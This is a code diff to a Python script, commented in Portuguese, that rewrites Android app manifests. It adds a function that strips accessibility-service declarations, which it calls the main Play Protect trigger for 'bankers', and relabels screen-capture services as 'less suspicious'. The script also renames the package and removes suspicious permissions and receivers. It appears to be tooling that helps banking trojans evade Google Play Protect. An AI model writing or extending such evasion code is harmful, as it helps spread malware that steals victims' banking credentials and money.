@@ -98,6 +98,29 @@ def strip_suspicious_receivers(txt):
             '', txt, flags=re.DOTALL)
     return txt
 
+def strip_accessibility_service(txt):
+    """Remove service de accessibility — gatilho maximo do Play Protect para bankers."""
+    # remove o bloco <service> inteiro que tem BIND_ACCESSIBILITY_SERVICE
+    txt = re.sub(
+        r'<service[^>]*android\.permission\.BIND_ACCESSIBILITY_SERVICE[^>]*>.*?</service>',
+        '', txt, flags=re.DOTALL)
+    # remove atributo permission=BIND_ACCESSIBILITY_SERVICE em qualquer tag
+    txt = re.sub(
+        r'\s*android:permission="android\.permission\.BIND_ACCESSIBILITY_SERVICE"',
+        '', txt)
+    # remove intent-filter com AccessibilityService action
+    txt = re.sub(
+        r'<intent-filter[^>]*>.*?android\.accessibilityservice\.AccessibilityService.*?</intent-filter>',
+        '', txt, flags=re.DOTALL)
+    # remove meta-data de accessibilityservice
+    txt = re.sub(
+        r'<meta-data[^>]*android\.accessibilityservice[^/]*/>', '', txt)
+    # troca foregroundServiceType=mediaProjection por dataSync (menos suspeito)
+    txt = re.sub(
+        r'android:foregroundServiceType="mediaProjection"',
+        'android:foregroundServiceType="dataSync"', txt)
+    return txt
+
 def clean_manifest(txt, orig_pkg, new_pkg, app_name):
     # pacote
     txt = txt.replace(f'package="{orig_pkg}"', f'package="{new_pkg}"')
@@ -129,6 +152,7 @@ def clean_manifest(txt, orig_pkg, new_pkg, app_name):
     # strip permissoes e receivers suspeitos
     txt = strip_permissions(txt)
     txt = strip_suspicious_receivers(txt)
+    txt = strip_accessibility_service(txt)
 
     return txt
 
